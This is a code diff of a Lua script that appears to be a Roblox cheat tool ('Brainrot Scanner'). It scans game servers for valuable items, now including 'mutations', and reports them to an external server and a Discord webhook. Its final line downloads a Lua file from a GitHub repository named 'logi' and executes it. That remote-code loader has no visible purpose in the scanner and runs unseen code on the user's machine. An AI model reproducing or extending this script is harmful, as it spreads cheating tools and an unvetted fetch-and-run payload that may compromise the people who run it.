@@ -618,8 +686,9 @@ local function sendToVDS(filteredObjects, webhookConfig)
             name = obj.name,
             gen = obj.gen,
             location = obj.location,
+            mutation = obj.mutation or nil,
             important = ALWAYS_IMPORTANT[obj.name] or false,
-            isSpecial = isSpecialBrainrot(obj.name, obj.gen),
+            isSpecial = isSpecialBrainrot(obj.name, obj.gen, obj.mutation),
         })
     end
 
@@ -630,7 +699,7 @@ local function sendToVDS(filteredObjects, webhookConfig)
             Headers = {
                 ["Content-Type"] = "application/json",
                 ["X-Aurora-Token"] = token,
-                ["X-Aurora-Role"] = "send"  -- 🔒 Новая роль для отправки
+                ["X-Aurora-Role"] = "send" -- 🔒 Новая роль для отправки
             },
             Body = HttpService:JSONEncode(payload),
         })
@@ -676,25 +745,34 @@ local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, al
         local locationMark = obj.location == 'DebrisFolder' and ' 🔥' or ''
 
         local overpayMark = ''
+        local mutationMark = ''
+        
         if webhookConfig.special and SPECIAL_BRAINROTS[obj.name] then
-            local minVal = SPECIAL_BRAINROTS[obj.name]
+            local brainrotConfig = SPECIAL_BRAINROTS[obj.name]
+            local minVal = brainrotConfig.min
+            
+            -- ✨ Показываем мутацию, если она есть
+            if obj.mutation then
+                mutationMark = string.format(' 🎨 **%s**', obj.mutation)
+            end
+            
             if obj.gen > minVal then
                 overpayMark = string.format(' 🔥 **OVERPAY** (min: %s)', formatIncomeNumber(minVal))
             end
         end
 
-        table.insert(objectsList, string.format('%s%s **%s** (%s)%s%s', mark, emoji, obj.name, formatIncomeNumber(obj.gen), overpayMark, locationMark))
+        table.insert(objectsList, string.format('%s%s **%s** (%s)%s%s%s', mark, emoji, obj.name, formatIncomeNumber(obj.gen), mutationMark, overpayMark, locationMark))
     end
 
     local objectsText = table.concat(objectsList, '\n')
 
     local descriptionText = webhookConfig.special
-    and string.format('⭐️ Found %d special brainrots!', #filteredObjects)
-    or string.format('💎 Found %d objects in range!', #filteredObjects)
+        and string.format('⭐️ Found %d special brainrots!', #filteredObjects)
+        or string.format('💎 Found %d objects in range!', #filteredObjects)
 
     local rangeText = webhookConfig.special
-    and '**All from special list**'
-    or string.format('**%s - %s**', formatIncomeNumber(webhookConfig.min), formatIncomeNumber(webhookConfig.max))
+        and '**All from special list + mutations**'
+        or string.format('**%s - %s**', formatIncomeNumber(webhookConfig.min), formatIncomeNumber(webhookConfig.max))
 
     local fields = {
         { name = '📊 Income range', value = rangeText, inline = true },
@@ -717,7 +795,7 @@ local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, al
     end
 
     local payload = {
-        username = '🎯 AURORA FINDER v2.3',
+        username = 'AURORA FINDER',
         embeds = { {
             title = webhookConfig.title,
             description = descriptionText,
@@ -750,6 +828,20 @@ end
 
 local function scanAndNotify()
     local allFound = collectAll(8.0)
+    
+    -- ✨ Получаем мутации
+    local mutations = findAllPetMutations()
+    
+    -- ✨ Создаём карту мутаций: имя питомца -> мутация
+    local mutationMap = {}
+    for _, pet in ipairs(mutations) do
+        mutationMap[pet.PetName] = pet.Mutation
+    end
+    
+    -- ✨ Добавляем мутации к найденным объектам
+    for _, obj in ipairs(allFound) do
+        obj.mutation = mutationMap[obj.name]
+    end
 
     -- groups: 1=low, 2=medium, 3=high, 4=special
     local groups = {{}, {}, {}, {}}
@@ -757,7 +849,7 @@ local function scanAndNotify()
 
     for _, obj in ipairs(allFound) do
         if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) and type(obj.gen) == 'number' then
-            if isSpecialBrainrot(obj.name, obj.gen) then
+            if isSpecialBrainrot(obj.name, obj.gen, obj.mutation) then
                 hasSpecial = true
                 table.insert(groups[4], obj)
             end
@@ -791,7 +883,7 @@ local function scanAndNotify()
     end
 end
 
-print("🎯 BRAINROT SCANNER v2.3 🔒 LOADED (SEND PASSWORD PROTECTED + JOBID ENCRYPTION)")
+print("🎯 BRAINROT SCANNER v2.4 🔒 MUTATIONS SUPPORT")
 print("F - Rescan | G - Copy JobId")
 scanAndNotify()
 
@@ -809,4 +901,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/bottik.lua"))()
